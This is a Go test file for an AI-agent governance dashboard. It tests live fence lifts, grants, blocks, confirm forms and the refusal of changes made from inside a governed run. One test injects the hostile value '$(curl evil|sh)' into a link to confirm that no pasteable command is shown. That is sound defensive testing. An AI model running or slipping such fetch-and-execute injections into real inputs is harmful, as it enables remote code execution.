// SPDX-License-Identifier: Apache-2.0

package web

import (
	"context"
	"errors"
	"html"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/attention-span-ai/tego/internal/control/rules"
	"github.com/attention-span-ai/tego/internal/control/runact"
	"github.com/attention-span-ai/tego/internal/liveblock"
	"github.com/attention-span-ai/tego/internal/testutil/ledgertest"
	"github.com/attention-span-ai/tego/pkg/spec/record"
)

// adjRun is the Adjustable run of liveFenceServer's ledger.
const adjRun = "r-aaaaaaaa-0000000000008-adjust"

// adjNetUntil is when the fixture's lift of the net fence entry ends: after the page's clock (newServer's).
var adjNetUntil = time.Date(2026, 10, 31, 21, 0, 0, 0, time.UTC)

// liveFenceServer is a dashboard over a ledger holding adjRun: a running Adjustable run at record minor 25 whose fence
// lists a read that is new access, a destination the launcher has lifted until adjNetUntil, and a program the contract
// refused; its run directory holds the run's live key and its lock is held, as a launcher's would be.
func liveFenceServer(t *testing.T) (*Server, *http.Cookie, string) {
	t.Helper()
	root := t.TempDir()
	proj := filepath.Join(t.TempDir(), "proj")
	if err := os.MkdirAll(proj, 0o700); err != nil {
		t.Fatal(err)
	}
	contract := filepath.Join(proj, "agent.yaml")
	if err := os.WriteFile(contract, []byte("version: 0\nname: adj\ncommand: [sh]\ntier: cgroup\nlive:\n  mode: adjustable\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	fence := &record.LiveFence{SHA256: strings.Repeat("0a", 32), Entries: []record.LiveFenceEntry{
		{Kind: "read", Value: "/srv/exports", Source: record.LiveFenceSourceNew, Rule: "live.fence[read:/srv/exports]"},
		{Kind: "net", Value: "api.stripe.com:443", Source: record.LiveFenceSourceNew, Rule: "live.fence[net:api.stripe.com:443]"},
		{Kind: "exec", Value: "/usr/bin/psql", Source: record.LiveFenceSourceDeny, Rule: "live.fence[exec:/usr/bin/psql]"},
	}}
	evs := []*record.Event{
		ledgertest.Event(t, record.KindRunStart, record.RunStartPayload{Tier: "cgroup", Capture: "off", RecordMinor: record.MinorLiveModes,
			ContractHash: strings.Repeat("0", 64), Command: []string{"sh"}, Cwd: proj, Kernel: "6", StopGrace: "1s",
			FSReads: &record.FSReads{Reads: record.FSReadsHeld, Why: "contract"}, LiveMode: record.LiveModeAdjustable, LiveFence: fence,
			ContractSource: &record.ContractSource{Path: contract}}),
		ledgertest.Event(t, record.KindGap, record.GapPayload{What: record.GapEnforce, Why: record.GapLiveRuleLifted,
			LiveBlock: &record.LiveBlockChange{Op: record.LiveOpLift, Kind: "net", Value: "api.stripe.com:443",
				Rule: "live.fence[net:api.stripe.com:443]", By: "uid:1000 pid:9 dashboard", Serial: 1,
				At: time.Date(2026, 10, 25, 12, 0, 0, 0, time.UTC), Until: adjNetUntil}}),
	}
	writeLines(t, root, adjRun, evs)
	dir := filepath.Join(root, adjRun)
	if _, err := liveblock.WriteKey(dir); err != nil {
		t.Fatal(err)
	}
	holdLock(t, dir)
	s := newServer(t, root)
	s.cfg.Rules = &rules.Service{Ledger: root, Now: s.cfg.Now, Check: func(string, string, []byte) error { return nil }}
	return s, login(t, s), dir
}

var hiddenField = regexp.MustCompile(`<input type="hidden" name="([a-z]+)" value="([^"]*)">`)

// previewForm is the confirm form's fields of the lift preview at target, as a browser posts them.
func previewForm(t *testing.T, s *Server, c *http.Cookie, target string) (url.Values, string) {
	t.Helper()
	w := do(s, "GET", target, "127.0.0.1:8484", c)
	if w.Code != http.StatusOK {
		t.Fatalf("GET %s: %d %s", target, w.Code, w.Body.String())
	}
	body := w.Body.String()
	form := url.Values{}
	for _, m := range hiddenField.FindAllStringSubmatch(body, -1) {
		form.Set(m[1], html.UnescapeString(m[2]))
	}
	return form, body
}

// overlayChanges is the run's overlay changes now; none when it has no overlay.
func overlayChanges(t *testing.T, dir string) []liveblock.Change {
	t.Helper()
	o, err := liveblock.Read(dir, adjRun)
	if errors.Is(err, os.ErrNotExist) {
		return nil
	}
	if err != nil {
		t.Fatal(err)
	}
	return o.Changes
}

// TestLiftPreview: the preview says what the run will be able to do, until when, who enforces it and what a limit
// cannot take back, and carries a confirm bound to that change; an exec entry says a copy is not covered; an entry
// outside the fence and a Locked run get no confirm.
func TestLiftPreview(t *testing.T) {
	s, c, _ := liveFenceServer(t)
	form, body := previewForm(t, s, c, "/runs/"+adjRun+"/lift?kind=read&value=/srv/exports&for=3d")
	mustContain(t, "the read preview", body, "This run will be able to read /srv/exports now, until ", "(in 3 days).",
		"Enforced by Tego's live layer, not the kernel. A time limit stops new access; anything already read or copied, files still open and live connections stay.",
		"I understand this run gets this access now", "Grant now", "tego grant "+adjRun+" read /srv/exports --for 3d")
	if strings.Contains(body, "A copy of this program") || strings.Contains(body, "Lift now") {
		t.Error("the read preview speaks of a program, or offers Lift for new access")
	}
	for _, k := range []string{"csrf", "kind", "value", "until", "serial", "permanent", "ack"} {
		if _, ok := form[k]; !ok {
			t.Errorf("the confirm form lacks %s", k)
		}
	}
	if form.Get("ack") == "" || form.Get("until") == "" || form.Get("permanent") != "" {
		t.Errorf("the confirm form %v: want an ack and an until, not permanent", form)
	}
	_, body = previewForm(t, s, c, "/runs/"+adjRun+"/lift?kind=exec&value=/usr/bin/psql&for=run")
	mustContain(t, "the exec preview", body, "This run will be able to run /usr/bin/psql now, for the rest of this run.",
		"Copies under another name not covered", "Lift now")
	_, body = previewForm(t, s, c, "/runs/"+adjRun+"/lift?kind=read&value=/etc&for=1h")
	mustContain(t, "a preview outside the fence", body, "is outside this run&#39;s fence")
	if strings.Contains(body, `name="ack"`) {
		t.Error("a preview outside the fence offers a confirm")
	}
	_, body = previewForm(t, s, c, "/runs/"+adjRun+"/lift?kind=read&value=/srv/exports&for=until&until=2020-01-01T10:00")
	mustContain(t, "a preview with a passed limit", body, "The time limit is not one")
}

// TestLiftPreviewUnreadableOverlay: a live-blocks file the lift preview cannot read is said in plain words
// (rulesview.LiveErrWords), never a JSON decoder's words, and the preview offers no confirm.
func TestLiftPreviewUnreadableOverlay(t *testing.T) {
	s, c, dir := liveFenceServer(t)
	if err := os.WriteFile(filepath.Join(dir, liveblock.FileName), []byte("{not json"), 0o600); err != nil {
		t.Fatal(err)
	}
	w := do(s, "GET", "/runs/"+adjRun+"/lift?kind=read&value=/srv/exports&for=1h", "127.0.0.1:8484", c)
	body := w.Body.String()
	mustContain(t, "the preview of a run whose overlay is damaged", body,
		"The run&#39;s live rules could not be read: live-block.json is damaged, or a newer Tego wrote it.")
	if strings.Contains(body, "invalid character") || strings.Contains(body, `name="ack"`) {
		t.Error("the preview words a damaged overlay as the decoder does, or offers a confirm")
	}
}

// TestLiftPostRefusals: a confirm without the checkbox, without the acknowledgement, with a stale one (another live
// change came first) or with a limit that has passed writes nothing.
func TestLiftPostRefusals(t *testing.T) {
	s, c, dir := liveFenceServer(t)
	target := "/runs/" + adjRun + "/lift"
	form, _ := previewForm(t, s, c, target+"?kind=read&value=/srv/exports&for=1h")
	cases := []struct {
		name, want string
		edit       func(url.Values)
	}{
		{"no checkbox", "Not done: tick", func(url.Values) {}},
		{"no acknowledgement", "changed since the preview", func(f url.Values) { f.Set("understand", "yes"); f.Del("ack") }},
		{"another limit", "changed since the preview", func(f url.Values) {
			f.Set("understand", "yes")
			f.Set("until", time.Now().Add(2*time.Hour).UTC().Format(time.RFC3339Nano))
		}},
		{"permanent added", "changed since the preview", func(f url.Values) { f.Set("understand", "yes"); f.Set("permanent", "1") }},
	}
	for _, tc := range cases {
		f := url.Values{}
		for k, v := range form {
			f[k] = append([]string(nil), v...)
		}
		tc.edit(f)
		if b := follow(t, s, c, post(s, target, f, own, "", c)); !strings.Contains(b, tc.want) {
			t.Errorf("%s: the page does not say %q", tc.name, tc.want)
		}
	}
	if ch := overlayChanges(t, dir); len(ch) != 0 {
		t.Fatalf("refused confirms wrote %+v", ch)
	}
	// A stale preview: another live change of the run since.
	if _, err := runact.BlockUntil(context.Background(), s.cfg.Ledger, adjRun, "exec", "/bin/ls", true, time.Time{}, "cli"); err != nil {
		t.Fatal(err)
	}
	form.Set("understand", "yes")
	if b := follow(t, s, c, post(s, target, form, own, "", c)); !strings.Contains(b, "Not done: this run&#39;s live rules changed since the preview. Preview again.") {
		t.Error("a stale preview: no plain line")
	}
	// A limit that has passed, under an acknowledgement that names it.
	past := time.Now().Add(-time.Minute).UTC()
	svc := s.cfg.Rules.(LiveAckService)
	f := url.Values{"csrf": {s.csrf}, "kind": {"read"}, "value": {"/srv/exports"}, "understand": {"yes"},
		"until": {past.Format(time.RFC3339Nano)}, "ack": {svc.LiveAck(adjRun, "read", "/srv/exports", past, false, 1)}}
	if b := follow(t, s, c, post(s, target, f, own, "", c)); !strings.Contains(b, "the time limit has passed") {
		t.Error("a passed limit: no plain line")
	}
	if ch := overlayChanges(t, dir); len(ch) != 1 || ch[0].Op != liveblock.OpAdd {
		t.Fatalf("overlay changes %+v: want only the block", ch)
	}
}

// TestLiftPostAndRestore: a confirmed preview asks runact.Lift, which writes a lift MAC'ed under the run's key with
// the limit and the dashboard as its writer; Restore writes a restore; a permanent lift goes on to Change rules.
func TestLiftPostAndRestore(t *testing.T) {
	s, c, dir := liveFenceServer(t)
	target := "/runs/" + adjRun + "/lift"
	form, _ := previewForm(t, s, c, target+"?kind=read&value=/srv/exports&for=1d")
	form.Set("understand", "yes")
	b := follow(t, s, c, post(s, target, form, own, "", c))
	mustContain(t, "the flash", b, "Asked: read /srv/exports until ", "(in 1 day) on run r-…adjust. Tego&#39;s live layer allows it within a second")
	ch := overlayChanges(t, dir)
	if len(ch) != 1 || ch[0].Op != liveblock.OpLift || ch[0].Kind != liveblock.KindRead || ch[0].Value != "/srv/exports" || ch[0].MAC == "" ||
		!strings.HasSuffix(ch[0].By, " dashboard") || ch[0].Until.Format(time.RFC3339Nano) != form.Get("until") {
		t.Fatalf("overlay changes %+v: want the lift", ch)
	}
	key, err := liveblock.ReadKey(dir)
	if err != nil || !liveblock.LiftMACOK(key, adjRun, ch[0]) {
		t.Fatalf("the lift's MAC does not check under the run's key: %v", err)
	}
	// The same confirm again is stale: the overlay moved.
	if b := follow(t, s, c, post(s, target, form, own, "", c)); !strings.Contains(b, "changed since the preview") {
		t.Error("a replayed confirm: no plain line")
	}
	f := url.Values{"csrf": {s.csrf}, "kind": {"read"}, "value": {"/srv/exports"}}
	b = follow(t, s, c, post(s, "/runs/"+adjRun+"/restore", f, own, "", c))
	mustContain(t, "the restore flash", b, "Restored: read /srv/exports is refused again on run r-…adjust.")
	if ch := overlayChanges(t, dir); len(ch) != 2 || ch[1].Op != liveblock.OpRestore || ch[1].MAC != "" {
		t.Fatalf("overlay changes %+v: want the lift and a restore", ch)
	}
	// Permanently: a lift with no end, then Change rules for the run's rules file.
	form, _ = previewForm(t, s, c, target+"?kind=exec&value=/usr/bin/psql&for=perm")
	form.Set("understand", "yes")
	w := post(s, target, form, own, "", c)
	if loc := w.Header().Get("Location"); w.Code != http.StatusSeeOther || !strings.HasPrefix(loc, "/rules/change?c=") {
		t.Fatalf("a permanent lift answered %d %q, want Change rules", w.Code, loc)
	}
	if ch := overlayChanges(t, dir); len(ch) != 3 || ch[2].Op != liveblock.OpLift || !ch[2].Until.IsZero() {
		t.Fatalf("overlay changes %+v: want a lift with no end", ch)
	}
	notice := func(w *httptest.ResponseRecorder) string {
		_, id, _ := strings.Cut(w.Header().Get("Location"), "flash=")
		id, _, _ = strings.Cut(id, "#")
		if f := s.takeFlash(id); f != nil {
			return f.Text
		}
		return ""
	}
	if n := notice(w); !strings.HasPrefix(n, "Lifted now. To keep it from the next run") {
		t.Errorf("the permanent lift's notice: %q", n)
	}
	// A permanent grant (new access) says so, as its fence row's chip does.
	form, _ = previewForm(t, s, c, target+"?kind=read&value=/srv/exports&for=perm")
	form.Set("understand", "yes")
	if n := notice(post(s, target, form, own, "", c)); !strings.HasPrefix(n, "Granted now. To keep it from the next run") {
		t.Errorf("the permanent grant's notice: %q", n)
	}
}

// TestLiftGovernedPeer: a lift and a restore from a connection made inside a run are refused before any handler
// runs, and nothing is written; the same posts from outside go through.
func TestLiftGovernedPeer(t *testing.T) {
	s, c, dir := liveFenceServer(t)
	form, _ := previewForm(t, s, c, "/runs/"+adjRun+"/lift?kind=net&value=api.stripe.com:443&for=1h")
	form.Set("understand", "yes")
	s.governed = func(*http.Request) error {
		return errors.New("a governed agent cannot change its own governance (run r-x)")
	}
	for _, target := range []string{"/runs/" + adjRun + "/lift", "/runs/" + adjRun + "/restore"} {
		if w := post(s, target, form, own, "", c); w.Code != http.StatusForbidden {
			t.Errorf("POST %s from inside a run: %d", target, w.Code)
		}
	}
	if ch := overlayChanges(t, dir); len(ch) != 0 {
		t.Fatalf("a governed peer wrote %+v", ch)
	}
	s.governed = func(*http.Request) error { return nil }
	if w := post(s, "/runs/"+adjRun+"/lift", form, own, "", c); w.Code != http.StatusSeeOther {
		t.Fatalf("the same lift from outside: %d", w.Code)
	}
	if ch := overlayChanges(t, dir); len(ch) != 1 || ch[0].Op != liveblock.OpLift {
		t.Fatalf("overlay changes %+v: want the lift", ch)
	}
}

// TestAdjustableRulesPage: an Adjustable run's Rules page names the mode and shows the fence panel with each entry's
// state (refused, granted until: a grant is new access, never "lifted"), Lift or Grant with a time limit, and Restore; its run page has the mode's chip.
func TestAdjustableRulesPage(t *testing.T) {
	s, c, _ := liveFenceServer(t)
	w := do(s, "GET", "/rules?run="+adjRun, "127.0.0.1:8484", c)
	if w.Code != http.StatusOK {
		t.Fatalf("rules page: %d %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	mustContain(t, "the Rules page", body, ">Adjustable</span>", "Compare modes", `id="live-fence"`,
		"Live policy inside the fence", ">Fence (kernel)</span>",
		"Read /srv/exports", ">Refused<", "Granted until ", "· granted by ", "Connect to api.stripe.com:443", "Run /usr/bin/psql",
		"best effort: a copy of the program under another name is not covered", "Grant…", "Lift…",
		`action="/runs/`+adjRun+`/restore"`, `action="/runs/`+adjRun+`/lift"`, `<option value="1h" selected="selected">1 hour</option>`)
	if strings.Contains(body, "Lifted until ") || strings.Contains(body, "· lifted by ") {
		t.Error("a granted entry (new access) reads as lifted")
	}
	run := do(s, "GET", "/runs/"+adjRun, "127.0.0.1:8484", c).Body.String()
	mustContain(t, "the run page", run, `b-mode" href="/rules?run=`+adjRun+`#live-fence"`, ">Adjustable</a>")
}

// TestBlockTimeLimit: Block now's time limit reaches runact as an absolute end; permanently places the block with no
// end and goes on to Change rules.
func TestBlockTimeLimit(t *testing.T) {
	s, c, dir := liveFenceServer(t)
	f := url.Values{"csrf": {s.csrf}, "kind": {"exec"}, "value": {"/bin/ls"}, "for": {"3d"}}
	b := follow(t, s, c, post(s, "/runs/"+adjRun+"/block", f, own, "", c))
	mustContain(t, "the block flash", b, "Blocked /bin/ls on run r-…adjust.", "It lasts until ", "(in 3 days).")
	o, err := liveblock.Read(dir, adjRun)
	if err != nil {
		t.Fatal(err)
	}
	if len(o.Blocks) != 1 || o.Blocks[0].Until.IsZero() || time.Until(o.Blocks[0].Until) < 71*time.Hour {
		t.Fatalf("blocks %+v: want one ending in 3 days", o.Blocks)
	}
	rules := do(s, "GET", "/rules?run="+adjRun, "127.0.0.1:8484", c).Body.String()
	mustContain(t, "the Rules page's live group", rules, `<span class="soft lf-ends">until `)
	f = url.Values{"csrf": {s.csrf}, "kind": {"net"}, "value": {"example.com:443"}, "for": {"perm"}}
	w := post(s, "/runs/"+adjRun+"/block", f, own, "", c)
	if loc := w.Header().Get("Location"); w.Code != http.StatusSeeOther || !strings.HasPrefix(loc, "/rules/change?c=") {
		t.Fatalf("a permanent block answered %d %q, want Change rules", w.Code, loc)
	}
	f = url.Values{"csrf": {s.csrf}, "kind": {"exec"}, "value": {"/bin/cat"}, "for": {"until"}}
	if b := follow(t, s, c, post(s, "/runs/"+adjRun+"/block", f, own, "", c)); !strings.Contains(b, "Not done: the time limit is not one: pick the date and time it ends.") {
		t.Error("until with no date: no plain line")
	}
}

// TestSetUpLiveSection: Set up writes a live: section only when Adjustable is picked, with the fence typed, and shows
// the modes and their comparison on the form.
func TestSetUpLiveSection(t *testing.T) {
	f := newRulesFix(t)
	f.withSetup(t)
	dir := filepath.Join(filepath.Dir(f.proj), "live-proj")
	if err := os.Mkdir(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	_, body := f.get(t, "/rules/new")
	mustContain(t, "the form", body, "While it runs", `name="live" value="locked" checked`,
		`name="live" value="adjustable"`, "Adjustable (live both ways)", "Compare modes", `name="fence_read"`, "<summary>Advanced</summary>")
	q := url.Values{"dir": {dir}, "preset": {"no-secrets"}, "cmd": {"sh"}, "preview": {"1"}, "live": {"locked"},
		"fence_read": {"/srv/exports"}}
	_, body = f.get(t, "/rules/new?"+q.Encode())
	if strings.Contains(body, "live:") || strings.Contains(body, "mode: adjustable") {
		t.Error("a Locked draft has a live: section")
	}
	q.Set("live", "adjustable")
	q.Set("fence_net", "api.stripe.com:443\n")
	q.Set("fence_exec", "/usr/bin/psql")
	_, body = f.get(t, "/rules/new?"+q.Encode())
	text := html.UnescapeString(body)
	mustContain(t, "the Adjustable draft", text, "live:\n  mode: adjustable\n  fence:\n    read:\n      - /srv/exports\n    net:\n      - api.stripe.com:443\n    exec:\n      - /usr/bin/psql\n",
		"Adjustable needs tier cgroup or bpflsm", `name="live" value="adjustable">`, `name="fence_net" value="api.stripe.com:443`)
}

// TestTimedBlocksOnPages: a block whose time limit has passed, which the overlay keeps for a day, shows as ended with
// no Remove, and a block unblocked for a while says until when, on the Rules page and on the run page; neither is
// called in force, and the live group no longer says every block ends with the run: with every block ended or
// unblocked, the in-force lede says none refuses anything now.
func TestTimedBlocksOnPages(t *testing.T) {
	s, c, dir := liveFenceServer(t)
	now := time.Now()
	s.cfg.Now = func() time.Time { return now }
	by := "uid:1000 pid:9 cli"
	if _, err := liveblock.Update(context.Background(), dir, adjRun, func(o *liveblock.Overlay) (bool, error) {
		if _, _, err := o.AddUntil(liveblock.KindExec, "/usr/bin/curl", by, now.Add(-3*time.Hour), now.Add(-2*time.Hour)); err != nil {
			return false, err
		}
		if _, _, err := o.Add(liveblock.KindExec, "/usr/bin/wget", by, now.Add(-time.Hour)); err != nil {
			return false, err
		}
		if _, _, err := o.RemoveUntil(liveblock.KindExec, "/usr/bin/wget", by, now.Add(-30*time.Minute), now.Add(3*time.Hour)); err != nil {
			return false, err
		}
		return true, nil
	}); err != nil {
		t.Fatal(err)
	}
	ended, back := chipUntil(now.Add(-2*time.Hour), now), chipUntil(now.Add(3*time.Hour), now)
	removeCurl := `name="value" value="/usr/bin/curl"`
	rp := do(s, "GET", "/rules?run="+adjRun, "127.0.0.1:8484", c).Body.String()
	mustContain(t, "the Rules page's live group", html.UnescapeString(rp), "ended at "+ended,
		"Its time limit has passed: it refuses nothing now.", "unblocked until "+back+", then refused again",
		"Unblocked for now: it refuses nothing until "+back+".",
		"Each is unblocked for a while or past its time limit, so none refuses anything now.")
	if strings.Contains(html.UnescapeString(rp), "They end with the run.") {
		t.Error("the Rules page's live group says every block ends with the run")
	}
	if strings.Contains(rp, removeCurl) {
		t.Error("the Rules page offers Remove on a block that has ended")
	}
	run := do(s, "GET", "/runs/"+adjRun, "127.0.0.1:8484", c).Body.String()
	mustContain(t, "the run page's live blocks", html.UnescapeString(run), ">Ended at "+ended+"<", ">Unblocked until "+back+"<",
		"Its time limit has passed: it refuses nothing now.")
	if n := strings.Count(strings.ToLower(html.UnescapeString(run)), "ended at "+strings.ToLower(ended)); n != 1 {
		t.Errorf("the run page says the block's end %d times, want once (its chip)", n)
	}
	if strings.Contains(run, "blocks active now") || strings.Contains(run, "1 block active now") {
		t.Error("the run page's highlights count an ended or unblocked block as active")
	}
	if strings.Contains(run, removeCurl) {
		t.Error("the run page offers Remove on a block that has ended")
	}
}

// TestLiftPreviewBadLinkNoCommand: a preview of a kind that does not parse shows why and no terminal command, so a
// crafted link cannot hand the person a command to paste.
func TestLiftPreviewBadLinkNoCommand(t *testing.T) {
	s, c, _ := liveFenceServer(t)
	_, body := previewForm(t, s, c, "/runs/"+adjRun+"/lift?kind="+url.QueryEscape("$(curl evil|sh)")+"&value=x&for=1h")
	mustContain(t, "the preview", body, "That is not a fence entry")
	if strings.Contains(body, "Same in a terminal") || strings.Contains(body, "tego lift "+adjRun) {
		t.Error("a preview of a kind that did not parse offers a terminal command")
	}
}

// TestLiftDoubleConfirm: two confirms of the same preview at once (a double click, a second tab) write one lift: the
// acknowledgement check and the write are one step against this dashboard's other lifts.
func TestLiftDoubleConfirm(t *testing.T) {
	s, c, dir := liveFenceServer(t)
	was := liftRun
	t.Cleanup(func() { liftRun = was })
	liftRun = func(ctx context.Context, root, run, kind, value string, until time.Time, via string) (runact.Lifted, error) {
		time.Sleep(50 * time.Millisecond) // widen the window between the check and the write
		return was(ctx, root, run, kind, value, until, via)
	}
	target := "/runs/" + adjRun + "/lift"
	form, _ := previewForm(t, s, c, target+"?kind=read&value=/srv/exports&for=1d")
	form.Set("understand", "yes")
	done := make(chan struct{})
	for range 2 {
		go func() {
			defer func() { done <- struct{}{} }()
			post(s, target, form, own, "", c)
		}()
	}
	<-done
	<-done
	if ch := overlayChanges(t, dir); len(ch) != 1 {
		t.Fatalf("overlay changes %+v: want one lift", ch)
	}
}

// TestPermanentMarkOnWatchedRun: "permanently" on a watched run, where a block is a mark that refuses nothing, says
// marked, not blocked, on its way to Change rules.
func TestPermanentMarkOnWatchedRun(t *testing.T) {
	s, c, _ := liveFenceServer(t)
	was := blockRun
	t.Cleanup(func() { blockRun = was })
	blockRun = func(_ context.Context, _, run, kind, value string, _ bool, _ time.Time, _ string) (runact.Blocked, error) {
		return runact.Blocked{Run: run, Rule: liveblock.Rule(liveblock.Kind(kind), value), Word: "blocked", Observe: true}, nil
	}
	f := url.Values{"csrf": {s.csrf}, "kind": {"net"}, "value": {"example.com:443"}, "for": {"perm"}}
	w := post(s, "/runs/"+adjRun+"/block", f, own, "", c)
	loc, err := url.Parse(w.Header().Get("Location"))
	if err != nil || w.Code != http.StatusSeeOther || loc.Path != "/rules/change" {
		t.Fatalf("a permanent mark answered %d %q, want Change rules", w.Code, w.Header().Get("Location"))
	}
	fl := s.takeFlash(loc.Query().Get("flash"))
	if fl == nil || !strings.HasPrefix(fl.Text, "Marked now (watched run, recorded only)") {
		t.Errorf("the flash %+v: want it to say marked, not blocked", fl)
	}
}

// TestBlockFlashSaysWhereALinkLeads: Block now through a link says the block refuses both
// paths only when the run stored the real path; on a run an older tego started it names the path left uncovered, and
// when the walk ran out of time it says the block refuses the value as written. A hidden character the agent put in a
// link's target is shown, not passed through.
func TestBlockFlashSaysWhereALinkLeads(t *testing.T) {
	s, c, _ := liveFenceServer(t)
	was := blockRun
	t.Cleanup(func() { blockRun = was })
	for _, tc := range []struct {
		name string
		b    runact.Blocked
		want string
	}{
		{"refuses both", runact.Blocked{Real: "/data/se\u202ecret"}, " It leads to /data/se⟦U+202E⟧cret through a link; the block refuses both."},
		{"older launcher", runact.Blocked{Uncovered: "/data/x"}, " It leads to /data/x through a link, which this run's older tego does not follow: block that path too."},
		{"out of time", runact.Blocked{RealUnknown: true}, " Whether it leads elsewhere through a link could not be worked out in time; it is refused as written."},
	} {
		t.Run(tc.name, func(t *testing.T) {
			blockRun = func(_ context.Context, _, run, kind, value string, _ bool, _ time.Time, _ string) (runact.Blocked, error) {
				b := tc.b
				b.Run, b.Rule, b.Word, b.ReadsSeen = run, liveblock.Rule(liveblock.Kind(kind), value), "blocked", true
				return b, nil
			}
			f := url.Values{"csrf": {s.csrf}, "kind": {"path"}, "value": {"/home/u/link/x"}}
			w := post(s, "/runs/"+adjRun+"/block", f, own, "", c)
			loc, err := url.Parse(w.Header().Get("Location"))
			if err != nil || w.Code != http.StatusSeeOther {
				t.Fatalf("Block now answered %d %q", w.Code, w.Header().Get("Location"))
			}
			fl := s.takeFlash(loc.Query().Get("flash"))
			if fl == nil || !strings.HasSuffix(fl.Text, tc.want) || (tc.b.Real == "" && strings.Contains(fl.Text, "refuses both")) {
				t.Errorf("the flash %+v: want it to end %q", fl, tc.want)
			}
		})
	}
}
